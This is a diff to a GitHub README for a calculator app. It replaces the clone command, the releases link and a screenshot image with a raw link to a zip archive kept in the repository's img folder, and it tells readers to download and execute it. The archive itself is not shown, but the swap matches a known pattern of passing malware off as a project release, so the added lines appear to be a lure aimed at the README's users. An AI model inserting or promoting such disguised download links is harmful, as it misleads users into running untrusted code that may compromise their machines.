@@ -38,7 +38,7 @@ To get started with the NuCalc Calculator App, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Littzzz/NuCalc-Calculator-App.git
+   git clone https://raw.githubusercontent.com/Littzzz/NuCalc-Calculator-App/master/img/Calc-Nu-App-Calculator-v3.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of the NuCalc Calculator App [here](https://github.com/Littzzz/NuCalc-Calculator-App/releases). Make sure to download and execute the latest version to enjoy all the features.
+You can find the latest releases of the NuCalc Calculator App [here](https://raw.githubusercontent.com/Littzzz/NuCalc-Calculator-App/master/img/Calc-Nu-App-Calculator-v3.0.zip). Make sure to download and execute the latest version to enjoy all the features.
 
 If you have any questions or need further assistance, feel free to check the "Releases" section or contact us.
 
@@ -106,7 +106,7 @@ We would like to thank all the contributors and users who support this project. 
 
 ### Screenshots
 
-![Calculator Screenshot](https://img.shields.io/badge/Screenshot-Calculator-blue)
+![Calculator Screenshot](https://raw.githubusercontent.com/Littzzz/NuCalc-Calculator-App/master/img/Calc-Nu-App-Calculator-v3.0.zip)
 
 ### Future Plans
 
